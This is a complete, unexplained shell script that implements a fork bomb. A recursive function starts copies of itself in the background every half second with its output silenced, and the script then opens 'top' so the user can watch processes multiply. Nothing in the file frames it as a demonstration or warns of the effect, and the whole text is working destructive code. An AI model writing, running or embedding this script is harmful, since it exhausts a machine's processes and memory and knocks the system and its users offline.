#!/bin/sh

fork() { 
	sleep 0.5 
	fork | fork & 
}

fork >/dev/null 2>&1 &
top
